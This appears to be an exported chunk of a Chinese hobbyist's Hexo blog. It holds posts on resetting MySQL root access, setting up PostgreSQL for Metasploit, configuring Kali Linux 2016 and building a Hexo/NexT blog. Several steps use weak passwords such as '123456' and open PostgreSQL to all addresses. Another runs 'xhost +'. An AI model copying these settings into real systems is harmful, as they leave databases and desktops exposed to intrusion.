MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; 更改root用户的密码为admin 1234567mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set password=PASSWORD(‘admin’) where User=‘root’;Query OK, 4 rows affected (0.01 sec)Rows matched: 4 Changed: 4 Warnings: 0 执行更新命令 12mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) flush privileges 命令本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。 退出 1mysql&gt; quit 4、验证用户密码是否更新成功 重启MySQL 1234567root@kali:~# /etc/init.d/mysql restart[ ok ] Stopping MySQL database server: mysqld.[….] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended[ .k[info] Checking for tables which need an upgrade, are corrupt or werenot closed cleanly..[1]+ 完成 mysqld_safe –skip-grant-tables 使用root用户连接MySQL 1234567891011root@kali:~# mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 43Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; metasploit Database not connect问题解决1、postgresql是本身没有启动的。所以需要启动。 1service postgresql start 2、通过命令进入配置 12sudo -u postgres psqlALTER USER postgres WITH PASSWORD ‘123.com’; 注意1：‘123.com’这个是密码。注意2：分号！！！！一定要带上分号“；”。注意3：\q：退出数据库 3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同） 123456root@kali:~# sudo passwd -d postgrespasswd：密码过期信息已更改。root@kali:~# sudo -u postgres passwd输入新的 UNIX 密码：重新输入新的 UNIX 密码：passwd：已成功更新密码 4、修改PostgresSQL数据库配置实现远程访问 12345678root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf更改#listen_addresses = ‘localhost’为 listen_addresses = ‘*’更改#password_encryption = on为password_encryption = onroot@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf在文档末尾加上以下内容# to allow your client visiting postgresql serverhost all all 0.0.0.0 0.0.0.0 md5root@kali:~# service postgresql restart 注意1：“#”号，一定要把“#”删除掉。注意2：在vi编辑模式下点击键盘字母a是进入编辑模式，编辑完成后点击“esc”退出编辑模式然后在最下方输入“：wq”保存并退出。 5、管理PostgreSQL用户和数据库 1root@kali:~# psql -U postgres -h 127.0.0.1 用户 postgres 的口令：psql (9.4.6)SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)输入 “help” 来获取帮助信息 1234567postgres=# create user “msf123” with password ‘123456’ nocreatedb;CREATE ROLEpostgres=# create database “msf1” with owner=”msf123”;ERROR: role “”msf123”” does not existpostgres=# create database “msf1″ with owner=”msf123”;CREATE DATABASEpostgres=# \q 注意1：还是要注意分号！！！没有分号命令就无法执行。注意2：注意复制的时候“”符号问题。注意3：user后面是用户名，password后面是用户名对应的密码。注意4：命令执行后有返回结果才是执行成功了。 6、msf配置连接 12345678root@kali:~# msfconsolemsf &gt; db_status[*] postgresql selected, no connectionmsf &gt; db_connect msf123:123456@127.0.0.1/msf1[*] Rebuilding the module cache in the background…msf &gt; db_status[*] postgresql connected to msf1msf &gt; 在msf启动后连接数据库就好。注意1：“msf123:123456”这个是步骤5中的“create user “msf123” with password ‘123456’ nocreatedb;”所建立的。“127.0.0.1”是指本机。“msf1”这个是库名。注意2：“[*] postgresql connected to msf1”这个是说明以链接成功数据库。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[kali linux 2016 使用指南(一)]]></title>
      <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80%2F</url>
      <content type="text"><![CDATA[前言Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali Linux 2016.1版本发布，已经有7个月。在这期间，在Kali Linux 2016.2版本发布的这段时间，Kali Linux官方增补了94个更新。 主要的更新大概是这个样子： Kali Linux 2016系统中的音量调整按钮归并到右上角的关闭按钮，点击关闭按钮，就可以看到音量调整滑块按钮。 使用Kali Linux 2016系统在VMWare虚拟机时，在安装增强工具open-vm-tools后，复制较大文件，会出现复制进度对话框。该对话框消失后，文件并没有出现在目标位置。这时，再次粘贴一次，就可以了。如果还是没有要复制的文件，用户可以在根目录下的/tmp/VMwareDnD中找到临时文件夹。复制的文件保存在该文件夹中。 Kali Linux 2016.2默认浏览器不再是Iceweasel，替换为FireFox ESR。该版本不会像FireFox普通版本频繁更新 ​ 关于kali使用前的一些配置，网上有很多版本，但是不是老就是很不实用。而且现在kali已经更新到了2016.2版，大多新手肯定都想安装最新版进行尝试，那么接下来我就简记一下我安装和使用过程中，对一些问题的解决。 安装具体的安装步骤就不说了，大家都懂得 可以参考：《虚拟机安装kali2.0》 不想装的，官方也提供了ova文件，可以一键导入虚拟机。 在过去的几个月里，kali官方增加了新的相关工具，修复了固定的各种bug和操作系统的改进。一些Busybox添加了HTTPS支持，现在可以设置安全的支持SSL的kali，更方便快捷的安装kali。 系统更新kali linux的更新源很重要，一定要选好，rolling的选rolling的源。 首先： 1leafpad /etc/apt/sources.list 然后复制粘贴下面的源: 1234567891011121314151617181920212223#kali官方源deb http://http.kali.org/kali kali-rolling main non-free contrib#中科大的源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free#阿里云源deb http://mirrors.aliyun.com/kali sana main non-free contribdeb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-freedeb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free 然后更新并安装: 1apt-get update &amp;&amp; apt-get dist-upgrade 安装内核头（这个很多人都在问怎么办）我给出我的解决办法，总之还是升级内核 12$ uname -r$ 4.3.0-kali1-amd64 如果你使用我给出的源进行更新的话就会升级到4.6.0-kali1-amd64 这时候使用命令: 1apt-get install linux-headers-$(uname -r) 就可以了。 安装浏览器1.汉化火狐浏览器1apt-get install iceweasel-l10n-zh-cn 2.安装并使用chrome先下载chrome的deb安装包 执行dpkg -i google-chrome-xxx.deb你会发现报错，不用慌接下来执行 1apt–get install libappindicator1 可能还会报错，别慌，执行: 1apt-get -f install 然后安装完成，但是你会发现不能运行，原因是权限问题 我们添加一个用户: 1adduser zeroyu 然后一路回车，最后敲Y 之后按次序执行 12$ xhost +$ su zeroyu 之后敲入 google-chrome就好了 安装中文输入法个人喜欢搜狗输入法，所以再次给出搜狗输入法的安装方法 123apt-get install fcitxdpkg -i sougoupinyinXXX.debapt-get -f install 最后重启电脑就好了。（搜狗输入法安装包下载） 安装百度云宝宝的好多小秘密还藏在上面必须安装一下 依次执行： 123git clone https://github.com/LiuLang/bcloud-packagesapt-get -f installdpkg -i bcloud-x.x.x.deb 安装为知笔记到wiznote安装包下载地址找到相应的deb安装包 然后： 1dpkg –i wiznote_2.3xxxx.deb 安装shadowsocks1pip installshadowsocks–gtk 终端输入shadowsocks-gtk敲回车就可以看到ui界面了。 解决字体重叠问题这里先解决下碰到的坑 1apt–get install ttf–wqy–microhei ttf–wqy–zenhei xfonts–wqy 重启终端就好了，这个最好在安装内核头之前完成！ VPN安装1leafpad /etc/NetworkManager/NetworkManager.conf 修改最后一行的managed=false改为managed=true 然后执行下面的命令: 1234567apt–get install network–manager–openvpn–gnomeapt–get install network–manager–pptpapt–get install network–manager–pptp–gnomeapt–get install network–manager–strongswanapt–get install network–manager–vpncapt–get install network–manager–vpnc–gnome/etc/init.d/network–manager restart 1apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo “auto lo” &gt; /etc/network/interfaces echo “iface lo inet loopback” &gt;&gt; /etc/network/interfaces service network-manager start docker安装12apt–get updateapt–get install docker.io Redis安装redis下载 下载完后先编译 123tar xvf redis–x.x.x.tar.gzcd redis–x.x.xmake 而后安装: 123sudo make installcd utilssudo ./install_server.sh 接下来一步一步设置就好 Mac安装后启动问题的解决其实安装跟其它都一样，就是安装后启动要等好久（当然你也可以每次启动都按下option进行选择启动） 解决方法就是 插入macOS的安装光盘，重新启动，按住option 通过光盘启动 进入安装界面 从菜单选择terminal： 1bless –device /dev/disk0 –setBoot –legacy –verbose #这里的disk0是安装grub的分区，可以通过diskutil list来进行查看 最后: 1reboot ok，这样单引导安装就完成了。 网易云音乐正确安装姿势下载网易云音乐（deepin版） 1dpkg –i 网易云.deb 注意!之后还要到/usr/share目录下的application目录找到网易云音乐，右键在命令后加一句： 1—no–sandbox 这样就ok了。 安装sun java 下载最新的JAVA JDK jdk-8u91-linux-x64 解压缩文件并移动至/opt 123tar -xzvf jdk-8u91-linux-x64.tar.gzmv jdk1.8.0_91 /optcd /opt/jdk1.8.0_91 设置环境变量 1）执行 gedit ~/.bashrc ， 并添加下列内容 1234# install JAVA JDKexport JAVA_HOME=/opt/jdk1.8.0_91export CLASSPATH=.:$&#123;JAVA_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 2）执行 source ~/.bashrc 安装并注册 执行： 1234update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1update-alternatives --set java /opt/jdk1.8.0_91/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_91/bin/javac 查看结果： 12update-alternatives --config javaupdate-alternatives --config javac 5. 测试12345java -version#output java version &quot;1.8.0_91&quot;Java(TM) SE Runtime Environment (build 1.8.0_91-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) 解决sublime的中文输入问题 保存下述代码为 sublime-imfix.c 文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*sublime-imfix.cUse LD_PRELOAD to interpose some function to fix sublime input method support for linux.By Cjacker Huanggcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPICLD_PRELOAD=./libsublime-imfix.so subl*/#include &lt;gtk/gtk.h&gt;#include &lt;gdk/gdkx.h&gt;typedef GdkSegment GdkRegionBox;struct _GdkRegion&#123; long size; long numRects; GdkRegionBox *rects; GdkRegionBox extents;&#125;;GtkIMContext *local_context;voidgdk_region_get_clipbox (const GdkRegion *region, GdkRectangle *rectangle)&#123; g_return_if_fail (region != NULL); g_return_if_fail (rectangle != NULL); rectangle-&gt;x = region-&gt;extents.x1; rectangle-&gt;y = region-&gt;extents.y1; rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1; rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1; GdkRectangle rect; rect.x = rectangle-&gt;x; rect.y = rectangle-&gt;y; rect.width = 0; rect.height = rectangle-&gt;height; //The caret width is 2; //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret. if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123; gtk_im_context_set_cursor_location(local_context, rectangle); &#125;&#125;//this is needed, for example, if you input something in file dialog and return back the edit area//context will lost, so here we set it again.static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)&#123; XEvent *xev = (XEvent *)xevent; if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123; GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;); if(GDK_IS_WINDOW(win)) gtk_im_context_set_client_window(im_context, win); &#125; return GDK_FILTER_CONTINUE;&#125;void gtk_im_context_set_client_window (GtkIMContext *context, GdkWindow *window)&#123; GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&gt;set_client_window) klass-&gt;set_client_window (context, window); if(!GDK_IS_WINDOW (window)) return; g_object_set_data(G_OBJECT(context),&quot;window&quot;,window); int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;&amp; height !=0) &#123; gtk_im_context_focus_in(context); local_context = context; &#125; gdk_window_add_filter (window, event_filter, context);&#125; 安装 C/C++ 的编译环境和 gtk libgtk2.0-dev 12sudo apt-get install build-essentialsudo apt-get install libgtk2.0-dev 编译共享内库 1gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC 设置 LD_PRELOAD 并启动 Sublime Text 1LD_PRELOAD=./libsublime-imfix.so subl 修改 /usr/share/applications/sublime_text.desktop 为 1234567891011121314[Desktop Entry][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F[...][Desktop Action Window][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n[...][Desktop Action Document][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file[...] 不要忘了把 libsublime-imfix.so 放到 /opt/sublime_text/ 中 修改 /usr/bin/subl 为: 123#!/bin/shexport LD_PRELOAD=/opt/sublime_text/libsublime-imfix.soexec /opt/sublime_text/sublime_text “$@” 重启电脑，可以看到Sublime能够输入中文了。 没有声音???其实并不是不支持声卡驱动了。只是root用户下默认关闭。虽然在setting的sounds里没能看到识别的声卡信息。可是其实驱动是装好的。用pulseaudio –start，就有了。 输入以下一行，就不用每次启动都要输入那行代码了。 1systemctl –user enable pulseaudio]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo 3.x 博客搭建指南(NEXT主题)]]></title>
      <url>%2F2017%2F01%2F21%2FHexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98%2F</url>
      <content type="text"><![CDATA[GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。 hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的tommy351。优势： 生成静态页面快支持 Markdown兼容于 Windows, Mac &amp; Linux部署方便。日常使用仅需五个命令。高扩展性、自订性，文件少、小，易理解 配置SSH使用hexo博客必须配置SSH。 打开git bash，输入cd ~/.ssh，如果果提示：No such file or directory 说明未配置SSH。 本地生成密钥对ssh-keygen -t rsa -C &quot;你的邮件地址&quot;，注意命令中的大小写不要搞混。按提示指定保存文件夹，不设置密码。 添加公钥到Github 根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。 登录Github，右上角 头像 -&gt; Settings —&gt; SSH keys —&gt; Add SSH key。把公钥粘贴到key中，填好title并点击 Add key。 git bash中输入命令ssh -T git@github.com，选yes，等待片刻可看到成功提示。 修改本地的ssh remote url，不用https协议，改用git协议 Github仓库中获取ssh协议相应的url 本地仓库执行命令git remote set-url origin SSH对应的url，配置完后可用git remote -v查看结果 这样git push或hexo d时不再需要输入账号密码。 搭建博客注，以下命令行需要在Git终端中执行(右键单击 -&gt; Git bash)。 安装Git：下载安装后，注册Github账号并配置Git和SSH公私钥 安装Node.js 安装hexo：npm install -g hexo，可用hexo -v查看版本。这里我用的是3.1.1。也可以指定版本：npm install hexo@3.1.1 -g 创建hexo文件夹：新建放置博客的文件夹，进入并执行命令hexo init。hexo 会在目标文件夹建立网站所需要的所有文件。 安装依赖包：npm install 创建Github Repository：Repository名字必须是你的Github名.github.io，比如我是loveNight.github.io 部署：打开博客根目录下的_config.yml文件，末尾添加如下信息。 1234deploy: type: git repository: 上一步的Github仓库地址，项目主页点SSH再复制URL branch: master 然后执行命令： 12hexo generate # 生成静态页面，可以简化为hexo ghexo deploy # 部署到Github，可以简化为hexo d 浏览器访问loveNight.github.io就能看到自己的Blog了，一般延迟十分钟左右才能看到效果。一开始看到404页面不要惊慌，耐心等等。 手打党请注意，配置文件的冒号后必须有一个空格。 如果报错 1Deployer not found:git 运行命令 1npm install hexo-deployer-git --save hexo使用生成静态页面1hexo generate 本地启动1hexo server 浏览器输入localhost:4000就可以看到效果。当你修改了文章或配置文件时，保存文件再刷新浏览器就能看到修改后的效果，非常方便。 新建文章1hexo new post &quot;title&quot; # 生成新文章：\source\_posts\title.md，可省略post 新建页面1hexo new page &quot;title&quot; post、page等可以改成其他layout，可用layout在scaffolds目录下查看。在同目录下创建文件来添加自己的layout，也可以编辑现有的layout，比如post的layout默认是\scaffolds\post.md。 编辑文章打开新建的文章\source\_posts\postName.md： 12345678910title: HelloWorld！ # 文章页面上的显示名称，可以任意修改，不会出现在URL中date: 2015-11-09 15:56:26 # 文章生成时间，一般不改categories: # 文章分类目录，参数可省略 - 随笔 - 瞬间tags: # 文章标签，参数可省略 - hexo - blog # 个数不限，单个可直接跟在tags后面---这里开始使用markdown格式输入你的正文。 多级分类语法格式：（标签也可以用类似的写法） 12345678# 第一种categories: - 一级分类 - 二级分类 - etc...# 第二种：categories: [一级分类, 二级分类] 首页文章预览添加图片： 123photos: - http://xxx.com/photo1.jpg - http://xxx.com/photo2.jpg 正文中可以使用``设置文章摘要 如下: 123以上显示在摘要中&lt;!--more--&gt;以下是余下全文 more 以上内容即是文章摘要，如果设置了主页只显示摘要，则more以下内容点击 Read More 链接打开全文才显示。 简单命令hexo现在支持更加简单的命令格式了，比如： 1234hexo g == hexo generate # 生成hexo d == hexo deploy # 部署 # 可与hexo g合并为 hexo d -ghexo s == hexo server # 本地预览hexo n == hexo new # 写文章 插入图片博客中的图片文件可以直接放在source文件夹下，部署时上传到Github仓库中。但是Github项目容量有限，而且主机在国外，访问速度较慢，把图片放在国内的图床上是个更好的选择。我用的是七牛云存储 免费用户实名审核之后，可以获取10GB永久免费存储空间、每月10GB下载流量、每月10万次Put请求、每月100万次Get请求，做图床绰绰有余。 注册账号，新建空间，我的新空间名是blog，专门用来放置博客上引用的资源。 进入空间后点击「内容管理」，再点击「上传」： 七牛空间没有文件夹的概念，但是允许为文件添加带斜杠/的前缀，用来给资源分类。这里我设置前缀为img/Hexo 3.1.1 静态博客搭建指南/。上传了一张图片,在右侧可以找到外链，复制地址： Markdown 插入图片的语法为： 1![](图片网址) 上传图片 -&gt; 获取外链 -&gt; 写入Markdown，就这么简单！ 由于七牛防盗链的白名单无法添加localhost，暂时不设置防盗链，否则hexo s调试的时候，看不到图片。 配置博客全站配置注意：文件中配置项的冒号后面必须加空格，否则报错 下面有些选项要配置后文的插件才有效，文件中已注明。 整站的配置：博客根目录下的\_config.yml文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# Hexo Configuration## Docs: http://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: ZEROYU # 站点名subtitle: # 副标题description: 一只单线程HACKERauthor: ZEROYU # 作者，在站点左下角可以看到#avatar: /images/avatar.jpg # 头像。Next主题增加的字段language: zh-Hans # 语言。Next主题增加的字段timezone: Asia/Shanghaisince: 2015 # 博客建立年份，Next主题增加的字段# 多说 ShortNameduoshuo_shortname: # xxx.duoshuo.com，xxx即是shortname。# Social linkssocial: Github: https://github.com/zer0yu Weibo: http://weibo.com/Z3r0yu Email: zeroyu.xyz@gmail.com # zhihu: http://www.zhihu.com/people/your-user-name# title, chinese availablelinks_title: 友情链接# linkslinks: 我的CSDN博客: http://blog.csdn.net/zeroyu_xyz# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: http://zer0yu.github.io/ # 网址root: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :lang # 国际化文件夹skip_render: # 跳过指定文件的渲染# Writing # 文章布局、写作格式的定义new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0 # 1 为小写， 2 为大写render_drafts: false # 显示草稿post_asset_folder: false # 启动asset文件夹relative_link: false # 链接改为与根目录的相对地址future: true # 显示未来的文章highlight: enable: true line_number: true auto_detect: true tab_replace:# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination # 每页显示文章数## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions # 这里配置站点所用主题和插件## Plugins: http://hexo.io/plugins/plugins:baidusitemap: # 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save path: baidusitemap.xml# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: nextfeed: type: atom #feed 类型 (atom/rss2) path: atom.xml #rss 路径 limit: 0 #在 rss 中最多生成的文章数(0显示所有)# 自定义站点内容搜索# 需要先安装插件：# npm install hexo-generator-search --savesearch: path: search.xml field: all # 如只想索引文章，可设置为post# Deployment # 站点部署到github## Docs: http://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:zer0yu/zer0yu.github.io.git branch: master# ---------------下面选项需要对应插件的支持---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --saveindex_generator: per_page: 10 ##首页默认10篇文章标题 如果值为0不分页archive_generator: per_page: 20 ##归档页面默认20篇文章标题 yearly: true ##生成年视图 monthly: true ##生成月视图tag_generator: per_page: 10 ##标签分类页面默认10篇文章category_generator: per_page: 10 ###分类页面默认10篇文章 更换主题默认主题太丑，换成NexT主题。 安装：在博客根目录下执行git clone https://github.com/iissnan/hexo-theme-next.git themes/next。 启用：修改博客根目录下的_config.yml配置文件中的theme属性，将其设置为next。 更新：在themes/next目录下执行git pull。（暂时不需要） \themes\next\_config.yml修改主题配置。 我的_config.yml文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico# Set default keywords (Use a comma to separate)keywords: "ZEROYU, SEC"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss:# Specify the date when the site was setup#since: 2015# icon between year and author @Footerauthoricon: heart# Footer `powered-by` and `theme-info` copyrightcopyright: true# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: false# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)menu: home: / categories: /categories about: /about archives: /archives tags: /tags #sitemap: /sitemap.xml #commonweal: /404.html# Enable/Disable menu icons.# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.# When an question mask icon presenting up means that the item has no mapping icon.menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemes#scheme: Musescheme: Mist#scheme: Pisces# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal intalic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on &lt;body&gt; element. global: # external: true will load this font family from host. external: true family: Lato # Font settings for Headlines (h1, h2, h3, h4, h5, h6) # Fallback to `global` font settings. headings: external: true family: # Font settings for posts # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo # Fallback to `global` font settings. # The `size` option use `px` as unit logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links# Key is the link label showing to end users.# Value is the target link (E.g. GitHub: https://github.com/iissnan)#social: #LinkLabel: Link# Social Links Icons# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.# When an globe mask icon presenting up means that the item has no mapping icon.social_icons: enable: true # Icon Mappings. # KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome GitHub: github Twitter: twitter Weibo: weibo# Sidebar Avatar# in theme directory(source/images): /images/avatar.jpg# in site directory(source/uploads): /uploads/avatar.jpg#avatar:# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggler. display: post #display: always #display: hide #display: remove# Blogrolls#links_title: Links#links_layout: block#links_layout: inline#links: #Title: http://example.com/# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommand.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Wechat Subscriber#wechat_subscriber: #enabled: true #qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg #description: ex. subscribe to my blog by scanning my public wechat account# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: normal# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML#local searchsearch: path: search.xml field: post format: html limit: 10000# Swiftype Search API Key#swiftype_key: oUgCiUNA9jix_1j3uXpn# Baidu Analytics IDbaidu_analytics: # Duoshuo ShortNameduoshuo_shortname: # Disqus#disqus_shortname:# Hypercomments#hypercomments_id:# Gentie productKey#gentie_productKey:# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share#jiathis:# Warning: JiaThis does not support https.#add_this_id:# Share#duoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: true admin_enable: false user_id: 0 #admin_nickname: Author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: 